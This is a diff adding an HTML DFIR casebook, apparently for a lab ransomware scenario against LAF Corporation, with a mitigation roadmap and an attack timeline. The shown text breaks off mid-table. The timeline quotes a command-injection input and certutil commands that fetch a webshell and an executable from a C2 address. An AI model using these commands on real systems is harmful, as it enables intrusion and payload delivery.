@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Casebook — JackofAllHacks-2026-03 — LAF Corporation (LAF.local)</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,700;1,9..144,400&family=IBM+Plex+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap');
+
+:root{
+  --bg:#05070a;--bg1:#0b0f14;--panel:#0e1319;
+  --green:#00ff9c;--red:#ff3b3b;--amber:#ffb800;
+  --cyan:#58a6ff;--violet:#c084fc;--text:#e6edf3;--muted:#8b949e;
+  --border:#21262d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+  font-family:'Inter',system-ui,sans-serif;
+  background:var(--bg);color:var(--text);
+  line-height:1.65;font-size:14px;
+  min-height:100vh;
+}
+
+/* CRT scanlines */
+body::after{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:1000;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 4px);
+}
+/* vignette */
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
+  background:radial-gradient(ellipse at 50% 50%,transparent 60%,rgba(0,0,0,.55) 100%);
+}
+
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:'IBM Plex Mono',monospace;font-size:.85em;
+  background:#161b22;color:var(--green);padding:2px 6px;border-radius:3px}
+strong{color:#f0f6fc}
+
+/* ── HAMBURGER NAV ── */
+#nav-toggle{
+  position:fixed;top:18px;right:20px;z-index:500;
+  background:var(--panel);border:1px solid var(--border);
+  color:var(--green);font-family:'IBM Plex Mono',monospace;
+  font-size:12px;padding:7px 14px;cursor:pointer;border-radius:3px;
+  letter-spacing:.06em;
+}
+#nav-toggle:hover{background:#1c2128}
+#nav-drawer{
+  position:fixed;top:0;right:-320px;width:300px;height:100vh;
+  background:var(--bg1);border-left:1px solid var(--border);
+  z-index:600;transition:.3s ease;overflow-y:auto;padding:20px;
+}
+#nav-drawer.open{right:0}
+#nav-close{
+  position:absolute;top:16px;right:16px;background:none;border:none;
+  color:var(--muted);font-size:18px;cursor:pointer;
+}
+#nav-drawer h3{font-family:'IBM Plex Mono',monospace;color:var(--green);
+  font-size:11px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:16px}
+.nav-item{display:block;padding:7px 10px;color:var(--muted);font-size:13px;
+  border-left:2px solid transparent;margin:2px 0;border-radius:0 3px 3px 0}
+.nav-item:hover{color:var(--text);border-left-color:var(--green);
+  background:#ffffff08;text-decoration:none}
+.nav-num{font-family:'IBM Plex Mono',monospace;color:var(--green);
+  font-size:10px;margin-right:8px}
+
+/* ── HERO ── */
+#hero{
+  min-height:100vh;display:flex;flex-direction:column;
+  justify-content:center;align-items:center;
+  padding:60px 24px;text-align:center;
+  background:linear-gradient(180deg,#05070a 0%,#0a0e14 100%);
+  position:relative;
+}
+.hero-tag{
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--green);
+  margin-bottom:24px;
+}
+.hero-title{
+  font-family:'Fraunces',serif;font-size:clamp(42px,7vw,88px);
+  font-weight:700;line-height:1.05;letter-spacing:-.02em;
+  color:var(--text);margin-bottom:8px;
+}
+.hero-title em{color:var(--green);font-style:normal;
+  text-shadow:0 0 40px rgba(0,255,156,.35)}
+.hero-sub{
+  font-family:'IBM Plex Mono',monospace;font-size:13px;
+  color:var(--muted);margin-bottom:48px;letter-spacing:.04em
+}
+.dossier{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:1px;background:var(--border);
+  max-width:960px;width:100%;
+  border:1px solid var(--border);border-radius:4px;overflow:hidden;
+  margin-bottom:40px;
+}
+.dos-cell{background:var(--panel);padding:12px 16px;text-align:left}
+.dos-cell .label{font-family:'IBM Plex Mono',monospace;font-size:9px;
+  letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.dos-cell .val{font-size:13px;color:var(--text);font-weight:500}
+.dos-cell .val.green{color:var(--green)}
+.dos-cell .val.red{color:var(--red)}
+.dos-cell .val.amber{color:var(--amber)}
+.scoreboard{
+  display:flex;gap:0;border:1px solid var(--border);border-radius:4px;
+  overflow:hidden;max-width:660px;width:100%
+}
+.score-cell{flex:1;padding:14px 10px;text-align:center;background:var(--panel)}
+.score-cell+.score-cell{border-left:1px solid var(--border)}
+.score-cell .s-num{font-family:'IBM Plex Mono',monospace;font-size:28px;
+  font-weight:700;line-height:1}
+.score-cell .s-lbl{font-size:10px;letter-spacing:.08em;
+  text-transform:uppercase;color:var(--muted);margin-top:4px}
+.stamp{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.18em;text-transform:uppercase;
+  color:var(--green);border:1px solid var(--green);
+  padding:4px 14px;margin-top:32px;opacity:.7;
+}
+
+/* ── SECTIONS ── */
+.section{padding:80px 24px;max-width:1000px;margin:0 auto}
+.sec-label{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--green);
+  margin-bottom:8px;
+}
+.sec-label::before{content:'// ';opacity:.5}
+.section h2{
+  font-family:'Fraunces',serif;font-size:clamp(28px,4vw,44px);
+  font-weight:700;color:var(--text);margin-bottom:32px;line-height:1.1
+}
+.divider{border:none;border-top:1px solid var(--border);margin:60px 0}
+
+/* ── SEVERITY BANNER ── */
+.sev-banner{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
+  gap:12px;margin:32px 0;
+}
+.sev-cell{background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:14px 16px}
+.sev-cell .sv-label{font-size:10px;letter-spacing:.08em;
+  text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.sev-cell .sv-val{font-family:'IBM Plex Mono',monospace;font-size:16px;font-weight:600}
+.sev-cell.red .sv-val{color:var(--red)}
+.sev-cell.amber .sv-val{color:var(--amber)}
+.sev-cell.green .sv-val{color:var(--green)}
+.sev-cell.cyan .sv-val{color:var(--cyan)}
+.sev-cell.violet .sv-val{color:var(--violet)}
+
+/* ── ROOT CAUSES ── */
+.root-causes{margin:24px 0}
+.root-row{display:flex;gap:16px;padding:12px 0;border-bottom:1px solid var(--border)}
+.root-row:last-child{border-bottom:none}
+.root-ctrl{min-width:180px;font-weight:600;color:var(--text)}
+.root-fail{color:var(--muted);font-size:13px}
+
+/* ── ROADMAP ── */
+.roadmap{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:24px 0}
+.rm-card{background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px}
+.rm-card h4{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px}
+.rm-card.p0 h4{color:var(--red)}
+.rm-card.p1 h4{color:var(--amber)}
+.rm-card.p2 h4{color:var(--cyan)}
+.rm-card ul{list-style:none;padding:0}
+.rm-card li{padding:4px 0;font-size:13px;color:var(--muted);
+  border-bottom:1px solid #ffffff08}
+.rm-card li::before{content:'› ';color:inherit}
+.rm-card.p0 li::before{color:var(--red)}
+.rm-card.p1 li::before{color:var(--amber)}
+.rm-card.p2 li::before{color:var(--cyan)}
+
+/* ── STORY STATS ── */
+.story-stats{
+  display:flex;gap:0;background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;overflow:hidden;margin:28px 0
+}
+.ss-cell{flex:1;padding:16px 12px;text-align:center}
+.ss-cell+.ss-cell{border-left:1px solid var(--border)}
+.ss-val{font-family:'IBM Plex Mono',monospace;font-size:22px;
+  font-weight:700;color:var(--green)}
+.ss-lbl{font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--muted);margin-top:4px}
+
+/* ── TIMELINE ── */
+.phase-block{margin:32px 0}
+.phase-label{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.15em;text-transform:uppercase;
+  color:var(--amber);margin-bottom:12px;padding-bottom:8px;
+  border-bottom:1px solid var(--border)
+}
+.tl-table{width:100%;border-collapse:collapse}
+.tl-table th{
+  text-align:left;font-family:'IBM Plex Mono',monospace;
+  font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--muted);padding:6px 12px;border-bottom:1px solid var(--border)
+}
+.tl-table td{padding:9px 12px;border-bottom:1px solid #ffffff06;font-size:13px;vertical-align:top}
+.tl-table tr:hover td{background:#ffffff04}
+.tl-time{font-family:'IBM Plex Mono',monospace;color:var(--amber);white-space:nowrap}
+.tl-host{color:var(--cyan);font-weight:500;white-space:nowrap}
+
+/* ── ATTACK GRAPH ── */
+#sec-graph .section{padding-bottom:0}
+.graph-wrap{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:24px;margin:24px 0;
+  overflow-x:auto;min-height:300px
+}
+.mermaid{font-family:'IBM Plex Mono',monospace}
+
+/* ── KILL-CHAIN REPLAY ── */
+.replay-shell{
+  background:var(--bg1);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;margin:24px 0
+}
+.replay-header{
+  background:#0d1117;border-bottom:1px solid var(--border);
+  padding:10px 16px;display:flex;align-items:center;gap:8px
+}
+.replay-dot{width:12px;height:12px;border-radius:50%}
+.replay-inner{display:grid;grid-template-columns:260px 1fr;min-height:320px}
+.host-rail{
+  background:var(--bg);border-right:1px solid var(--border);padding:16px 12px
+}
+.host-rail h4{font-family:'IBM Plex Mono',monospace;font-size:9px;
+  letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+.host-chip{
+  padding:7px 12px;border-radius:3px;margin:4px 0;font-size:12px;
+  font-family:'IBM Plex Mono',monospace;background:#161b22;
+  border:1px solid var(--border);color:var(--muted);
+  transition:.4s;cursor:default;
+}
+.host-chip.active{color:var(--amber);border-color:var(--amber);
+  background:#ffb80012;box-shadow:0 0 8px rgba(255,184,0,.2)}
+.host-chip.pwned{color:var(--red);border-color:var(--red);
+  background:#ff3b3b12;box-shadow:0 0 8px rgba(255,59,59,.2)}
+.event-feed{padding:16px;overflow-y:auto;max-height:380px;font-size:12px}
+.ev-row{
+  display:flex;gap:12px;padding:7px 0;border-bottom:1px solid #ffffff06;
+  opacity:.35;transition:.3s
+}
+.ev-row.fired{opacity:1}
+.ev-row.current{opacity:1;background:#ffffff08;border-radius:3px;padding-left:6px}
+.ev-dot{width:8px;height:8px;border-radius:50%;margin-top:3px;flex-shrink:0}
+.ev-time{font-family:'IBM Plex Mono',monospace;color:var(--muted);white-space:nowrap}
+.ev-host{color:var(--cyan);white-space:nowrap;font-weight:600}
+.ev-desc{color:var(--text)}
+.transport{
+  background:#0d1117;border-top:1px solid var(--border);
+  padding:12px 16px;display:flex;align-items:center;gap:12px
+}
+.tp-btn{
+  background:var(--panel);border:1px solid var(--border);
+  color:var(--text);padding:6px 14px;border-radius:3px;cursor:pointer;
+  font-family:'IBM Plex Mono',monospace;font-size:13px
+}
+.tp-btn:hover{border-color:var(--green);color:var(--green)}
+.tp-btn.active{background:#00ff9c18;border-color:var(--green);color:var(--green)}
+.tp-speed{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-left:4px}
+.scrub-wrap{flex:1;position:relative;height:4px;background:var(--border);
+  border-radius:2px;cursor:pointer}
+.scrub-fill{height:100%;background:var(--green);border-radius:2px;transition:.1s}
+.ev-counter{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);white-space:nowrap}
+
+/* ── FINDING CARDS ── */
+.act-divider{
+  margin:48px 0 24px;padding:20px 24px;
+  background:var(--panel);border:1px solid var(--border);border-radius:4px;
+  border-left:3px solid var(--amber)
+}
+.act-num{font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.15em;text-transform:uppercase;color:var(--amber);margin-bottom:4px}
+.act-title{font-family:'Fraunces',serif;font-size:22px;font-weight:700;color:var(--text)}
+.act-tc{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-top:4px}
+
+.finding-card{
+  border:1px solid var(--border);border-radius:4px;overflow:hidden;
+  margin:20px 0;background:var(--panel);
+}
+.finding-card.critical{border-left:3px solid var(--red)}
+.finding-card.high{border-left:3px solid var(--amber)}
+.finding-card.medium{border-left:3px solid var(--violet)}
+.finding-card.low{border-left:3px solid var(--cyan)}
+.fc-header{padding:16px 20px;background:#0d1117;border-bottom:1px solid var(--border)}
+.fc-id{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-bottom:4px}
+.fc-title{font-size:17px;font-weight:700;color:var(--text);margin-bottom:10px}
+.fc-meta{display:flex;flex-wrap:wrap;gap:12px;font-size:12px;color:var(--muted)}
+.fc-meta span{font-family:'IBM Plex Mono',monospace}
+.fc-meta .k{color:var(--muted);margin-right:4px}
+.fc-meta .v{color:var(--text)}
+.fc-body{padding:20px}
+.fc-body p{color:var(--muted);font-size:13px;margin:8px 0}
+.fc-body h4{color:var(--text);margin:16px 0 6px;font-size:13px;
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+pre.term{
+  background:#0d1117;border:1px solid var(--border);border-radius:3px;
+  padding:14px 16px;overflow-x:auto;font-family:'IBM Plex Mono',monospace;
+  font-size:12px;color:var(--green);line-height:1.6;margin:10px 0;
+  white-space:pre-wrap;word-break:break-all
+}
+.sev-badge{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  font-weight:700;letter-spacing:.06em;padding:2px 8px;border-radius:3px}
+
+/* ── HOST GRID ── */
+.host-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin:24px 0}
+.host-card{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px;
+}
+.hc-name{font-family:'IBM Plex Mono',monospace;font-size:13px;
+  font-weight:600;color:var(--text);margin-bottom:4px}
+.hc-ip{font-size:12px;color:var(--muted);font-family:'IBM Plex Mono',monospace;margin-bottom:8px}
+.hc-role{font-size:11px;letter-spacing:.06em;text-transform:uppercase;
+  padding:2px 8px;border-radius:10px;display:inline-block;margin-bottom:8px}
+.hc-verdict{font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700}
+.hc-verdict.pwnd{color:var(--red)}
+.hc-verdict.comp{color:var(--amber)}
+.hc-verdict.hard{color:var(--green)}
+
+/* ── TTP MATRIX ── */
+.ttp-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
+  gap:8px;margin:24px 0
+}
+.ttp-cell{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:14px;
+}
+.ttp-tactic{font-size:9px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:4px}
+.ttp-name{font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px}
+.ttp-id{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--green)}
+.ttp-ev{font-size:12px;color:var(--muted);margin-top:6px}
+
+/* ── ATTACK CHAINS ── */
+.chain-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin:24px 0}
+.chain-card{
+  background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:20px
+}
+.chain-title{font-size:14px;font-weight:700;color:var(--text);margin-bottom:8px}
+.chain-body{font-size:13px;color:var(--muted);margin-bottom:12px}
+.chain-status{
+  display:inline-block;font-family:'IBM Plex Mono',monospace;
+  font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  padding:3px 10px;border-radius:10px
+}
+.chain-status.cleared{background:#00ff9c18;color:var(--green);border:1px solid #00ff9c30}
+.chain-status.partial{background:#ffb80018;color:var(--amber);border:1px solid #ffb80030}
+.chain-bar{height:3px;background:var(--border);border-radius:2px;margin-top:12px}
+.chain-fill{height:100%;border-radius:2px;background:var(--green)}
+
+/* ── DEAD ENDS ── */
+.reject-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin:24px 0}
+.reject{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px;border-left:3px solid var(--muted)
+}
+.reject-title{font-size:13px;font-weight:600;color:var(--muted);margin-bottom:6px}
+.reject-why{font-size:12px;color:#6e7681}
+
+/* ── STRENGTHS ── */
+.strength-list{list-style:none;margin:20px 0}
+.strength-list li{
+  padding:10px 16px;border-bottom:1px solid var(--border);
+  font-size:13px;color:var(--muted)
+}
+.strength-list li::before{content:'✓ ';color:var(--green);font-weight:700}
+
+/* ── CLOSE STAMP ── */
+#sec-close{
+  text-align:center;padding:100px 24px;background:var(--bg1);
+  border-top:1px solid var(--border)
+}
+.close-stamp{
+  display:inline-block;
+  border:3px solid var(--green);
+  padding:20px 48px;
+  font-family:'IBM Plex Mono',monospace;
+  font-size:clamp(18px,3vw,32px);
+  font-weight:700;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--green);
+  transform:rotate(-2deg);
+  text-shadow:0 0 20px rgba(0,255,156,.5);
+  box-shadow:0 0 30px rgba(0,255,156,.15),inset 0 0 30px rgba(0,255,156,.05);
+  margin-bottom:32px;
+}
+.close-meta{font-family:'IBM Plex Mono',monospace;font-size:12px;
+  color:var(--muted);letter-spacing:.06em;margin-top:8px}
+.close-caption{max-width:600px;margin:24px auto 0;
+  font-size:14px;color:var(--muted);line-height:1.7}
+.tlp{
+  display:inline-block;margin-top:24px;
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.12em;padding:4px 14px;
+  border:1px solid #ff3b3b60;color:var(--red);border-radius:3px
+}
+
+/* ── MISC ── */
+.md-table{border-collapse:collapse;width:100%;margin:12px 0;font-size:13px}
+.md-table th{background:#0d1117;color:var(--cyan);text-align:left;
+  padding:8px 12px;border-bottom:2px solid var(--border);
+  font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+.md-table td{padding:8px 12px;border-bottom:1px solid var(--border);color:var(--muted)}
+.md-table tr:hover td{background:#ffffff04}
+blockquote{border-left:3px solid var(--amber);padding:10px 16px;
+  background:#ffb80010;border-radius:0 4px 4px 0;margin:12px 0;
+  color:var(--muted);font-style:italic}
+@media(max-width:640px){
+  .replay-inner{grid-template-columns:1fr}
+  .host-rail{display:none}
+  .roadmap,.dossier,.story-stats{grid-template-columns:1fr}
+}
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+</head>
+<body>
+
+<button id="nav-toggle">≡ CHAPTERS</button>
+<div id="nav-drawer">
+  <button id="nav-close">×</button>
+  <h3>// Chapters</h3>
+  <nav id="nav-links"></nav>
+</div>
+
+<section id="hero" data-nav="Hero / Dossier">
+  <p class="hero-tag">// Protocol SIFT — DFIR Operator Casebook</p>
+  <h1 class="hero-title">Jack<em>of</em>AllHacks</h1>
+  <p class="hero-sub">LAF Corporation (LAF.local) &nbsp;·&nbsp; 2026-03-03 → 2026-03-08 &nbsp;·&nbsp; DFIR / Black Box</p>
+  <div class="dossier"><div class="dos-cell"><div class="label">Engagement ID</div><div class="val ">JackofAllHacks-2026-03</div></div><div class="dos-cell"><div class="label">Client / Target</div><div class="val ">LAF Corporation (LAF.local)</div></div><div class="dos-cell"><div class="label">Window</div><div class="val ">2026-03-03 → 2026-03-08</div></div><div class="dos-cell"><div class="label">Model</div><div class="val ">DFIR / Black Box</div></div><div class="dos-cell"><div class="label">Scope</div><div class="val ">Full domain: DC01, DC02, SVR01, WS01, WS02, IIS-SERV-PROD, AWS 464381121764</div></div><div class="dos-cell"><div class="label">Operator</div><div class="val ">DFIR Analyst — Protocol SIFT</div></div><div class="dos-cell"><div class="label">Sophistication</div><div class="val amber">Medium-High (Impacket / C2 framework / ransomware deployment)</div></div><div class="dos-cell"><div class="label">Objective</div><div class="val red">Domain dominance + ransomware deployment</div></div><div class="dos-cell"><div class="label">Worst Outcome</div><div class="val red">Full LAF.local domain encrypted; EC2 instance credentials stolen from AWS</div></div><div class="dos-cell"><div class="label">Time-to-DA</div><div class="val red">~4 min (implant 19:59 → serviceaccount Domain Admin 20:03)</div></div><div class="dos-cell"><div class="label">Hosts Pwn3d</div><div class="val red">6</div></div><div class="dos-cell"><div class="label">Forests</div><div class="val red">1</div></div><div class="dos-cell"><div class="label">Tooling</div><div class="val ">Impacket psexec/smbexec, Certutil, rnSylwOz (C2 agent), IamBatman.exe, Advanced IP Scanner, FileZilla, LogDel.bat, comsvcs LSASS dump</div></div><div class="dos-cell"><div class="label">Testing Mode</div><div class="val ">Adversary Simulation / Ransomware Group TTP Replication</div></div><div class="dos-cell"><div class="label">TTPs Catalogued</div><div class="val green">22</div></div><div class="dos-cell"><div class="label">IOC Volume</div><div class="val ">C2 IP 173.230.136.180:8443 · Attacker subnet 198.51.100.0/24 · 8 malicious files · 3 backdoor accounts</div></div></div>
+  <div class="scoreboard"><div class="score-cell"><div class="s-num" style="color:var(--red)">4</div><div class="s-lbl">Critical</div></div><div class="score-cell"><div class="s-num" style="color:var(--amber)">1</div><div class="s-lbl">High</div></div><div class="score-cell"><div class="s-num" style="color:var(--violet)">0</div><div class="s-lbl">Medium</div></div><div class="score-cell"><div class="s-num" style="color:var(--cyan)">0</div><div class="s-lbl">Low</div></div><div class="score-cell"><div class="s-num" style="color:var(--muted)">0</div><div class="s-lbl">Info</div></div><div class="score-cell"><div class="s-num" style="color:var(--green)">6</div><div class="s-lbl">Hosts</div></div></div>
+  <div class="stamp">CONFIDENTIAL // FOR OPERATOR EYES ONLY</div>
+</section>
+
+<div id="sec-exec" data-nav="Executive Briefing" style="background:#0a0e14"><div class="section"><p class="sec-label">01 · executive briefing</p><h2>What actually happened</h2>
+<div class="sev-banner">
+  <div class="sev-cell red"><div class="sv-label">Severity</div><div class="sv-val">CRITICAL</div></div>
+  <div class="sev-cell red"><div class="sv-label">Hosts Pwn3d</div><div class="sv-val">6</div></div>
+  <div class="sev-cell amber"><div class="sv-label">Time-to-DA</div><div class="sv-val">~4 min (implant 19:59 → serviceaccount Domain Admin 20:03)</div></div>
+  <div class="sev-cell red"><div class="sv-label">Recoverability</div><div class="sv-val">NONE</div></div>
+  <div class="sev-cell violet"><div class="sv-label">Data Exfil</div><div class="sv-val">Confirmed</div></div>
+  <div class="sev-cell amber"><div class="sv-label">Cloud Blast</div><div class="sv-val">AWS EC2 Role</div></div>
+</div><h3>Root Causes</h3><div class="root-causes"><div class="root-row"><div class="root-ctrl">Web Application Security</div><div class="root-fail">No input validation on CheckStatus.aspx · OWASP A01/A03</div></div><div class="root-row"><div class="root-ctrl">Service Hardening</div><div class="root-fail">Unquoted SolarwindsTFTP service path · exploited to SYSTEM</div></div><div class="root-row"><div class="root-ctrl">Credential Hygiene</div><div class="root-fail">Reuse of LAFAdmin DA creds from compromised server</div></div><div class="root-row"><div class="root-ctrl">Network Segmentation</div><div class="root-fail">No east-west controls — ransomware spread domain-wide</div></div><div class="root-row"><div class="root-ctrl">Endpoint Detection</div><div class="root-fail">No EDR alert on rnSylwOz.exe ADMIN$ service creation</div></div><div class="root-row"><div class="root-ctrl">Cloud Security</div><div class="root-fail">IMDSv2 not enforced; EC2 role over-permissioned for S3</div></div><div class="root-row"><div class="root-ctrl">Backup Resilience</div><div class="root-fail">VSS deleted; no offline/immutable backup existed</div></div></div><h3>Mitigation Roadmap</h3><div class="roadmap">
+<div class="rm-card p0"><h4>P0 — Within 48h</h4><ul><li>Disable or remove CheckStatus.aspx. Revoke IIS application pool account privileges.</li><li>Quote the service path: `&quot;C:\Program Files\SolarWinds\TFTP Server\SolarWinds TFTP Server.exe&quot;`.</li><li>Delete `LAF\serviceaccount`. Reset all Domain Admin passwords including LAFAdmin. Rotate krbtgt ×2.</li><li>Rotate `krbtgt` ×2 (invalidates all Kerberos tickets). Revoke/rotate EC2 instance role. Enforce IMDSv2 (hop-limit=1).</li><li>Isolate all affected hosts. Restore from offline backups (if available). Do not pay ransom.</li></ul></div>
+<div class="rm-card p1"><h4>P1 — Within 2wk</h4><ul><li>Implement parameterised command execution; deploy WAF rule blocking shell metacharacters in URL parameters.</li><li>Audit all service paths for unquoted entries (PowerShell: `Get-WmiObject Win32_Service | Where {$_.PathName -notmatch &#x27;&quot;&#x27;}`).</li><li>Restrict ADMIN$ access; enforce tiered admin model (PAW + jump server); enable Protected Users for all DA accounts.</li><li>Deploy Azure AD / Entra SSPR to mass-reset all user passwords. Enable CloudTrail data events on all S3 buckets.</li><li>Rebuild from clean images. Implement immutable backup solution (3-2-1 with air-gap). Restrict SYSVOL write permissions.</li></ul></div>
+<div class="rm-card p2"><h4>P2 — Within 30d</h4><ul><li>DAST integration in CI/CD pipeline; annual web application penetration test.</li><li>Restrict write access to program directories; deploy application allow-listing.</li><li>Deploy Privileged Access Workstations; implement Just-In-Time privileged access.</li><li>Secrets Manager for application credentials; detective control alerting on NTDS access.</li><li>Network segmentation to prevent east-west ransomware propagation; endpoint detection covering scheduled task creation + shadow copy deletion.</li></ul></div>
+</div><div class="sev-banner"><div class="sev-cell red"><div class="sv-label">Residual Risk</div><div class="sv-val">HIGH — krbtgt must be rotated ×2; all AD creds are compromised</div></div></div></div></div><hr class="divider">
+<div id="sec-story" data-nav="The Story"><div class="section"><p class="sec-label">02 · the story</p><h2>How it unfolded</h2><div class="story-stats">
+  <div class="ss-cell"><div class="ss-val">5</div><div class="ss-lbl">Findings</div></div>
+  <div class="ss-cell"><div class="ss-val">42</div><div class="ss-lbl">Timeline Events</div></div>
+  <div class="ss-cell"><div class="ss-val">6</div><div class="ss-lbl">Hosts Pwn3d</div></div>
+  <div class="ss-cell"><div class="ss-val">~3h</div><div class="ss-lbl">Total Dwell</div></div>
+  <div class="ss-cell"><div class="ss-val">Full Domain</div><div class="ss-lbl">Objective</div></div>
+</div><p>On 2026-03-08, threat actor <strong>Saiyan Spider</strong> exploited an OS command injection vulnerability in a public-facing IIS diagnostic page (<code>CheckStatus.aspx</code>) belonging to LAF Corporation. Within minutes, the actor uploaded a C# webshell (<code>so.aspx</code>) via <code>certutil</code> and escalated to SYSTEM by hijacking an unquoted SolarwindsTFTP service path. From the IIS host, the attacker stole the EC2 instance-role credentials and used them from an external VPS (212.8.249.213) to exfiltrate 164 S3 objects. In parallel, an Impacket-style C2 implant (<code>rnSylwOz.exe</code>) was deployed to LAF-SVR01 via ADMIN$ remote service execution. Within four minutes of the implant landing, the attacker had created a new Domain Admin account (<code>serviceaccount</code>, password <code>P@ssw0RD1!</code>), dumped NTDS.dit via VSS, and was operating with full domain authority. The following three hours saw RDP lateral movement across all domain members, persistence installation on every host, credential harvesting (LSASS, DonPAPI, DPAPI), and culmination in synchronized <code>.bWqQUx</code> ransomware deployment at 22:08 UTC. Total dwell from first web request to domain compromise: <strong>25 minutes</strong>. Time to ransomware: <strong>2 hours 30 minutes</strong>.</p></div></div><hr class="divider">
+<div id="sec-timeline" data-nav="Master Timeline"><div class="section"><p class="sec-label">03 · master timeline</p><h2>Attack timeline</h2><div class="phase-block">
+<p class="phase-label">Phase 0 · Unauthenticated Recon</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 18:38:29</td><td class='tl-host'>IIS-SERV-PROD</td><td>Attacker (172.236.127.251) browses to barrygoodtech.com</td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr><tr><td class='tl-time'>2026-03-08 18:40:01</td><td class='tl-host'>IIS-SERV-PROD</td><td>First OS command injection: `url=Google.com \</td><td style='color:var(--muted);font-size:11px'>whoami` via CheckStatus.aspx</td></tr><tr><td class='tl-time'>2026-03-08 18:41:13</td><td class='tl-host'>IIS-SERV-PROD</td><td>Successful <code>whoami</code> returns IIS service account context</td><td style='color:var(--muted);font-size:11px'>IIS log sc-bytes=1345</td></tr><tr><td class='tl-time'>2026-03-08 18:42:38</td><td class='tl-host'>IIS-SERV-PROD</td><td>Directory enumeration: <code>dir C:\inetpub</code> via cmd injection</td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr><tr><td class='tl-time'>2026-03-08 18:45:12</td><td class='tl-host'>IIS-SERV-PROD</td><td>Discovers <code>C:\&quot;TFTP Server&quot;</code> — identifies SolarwindsTFTP unquoted path</td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr></tbody></table></div><div class="phase-block">
+<p class="phase-label">Phase 1 · Initial Foothold</p>
+<table class="tl-table"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead>
+<tbody><tr><td class='tl-time'>2026-03-08 18:51:42</td><td class='tl-host'>IIS-SERV-PROD</td><td><code>certutil -urlcache -f http://173.230.136.180:80/so.aspx C:\inetpub\wwwroot\so.aspx</code></td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr><tr><td class='tl-time'>2026-03-08 18:52:20</td><td class='tl-host'>IIS-SERV-PROD</td><td><code>certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe</code></td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr><tr><td class='tl-time'>2026-03-08 19:08:42</td><td class='tl-host'>IIS-SERV-PROD</td><td>First POST to so.aspx — webshell activated (curl/8.5.0, 7556 bytes returned)</td><td style='color:var(--muted);font-size:11px'>IIS W3SVC log</td></tr><tr><td class='tl-time'>2026-03-08 19:38:02</td><td class='tl-host'>IIS-SERV-PROD</td><td>SolarwindsTFTP service starts Solarwinds.exe — SYSTEM achieved via unquoted path hijack</td><td 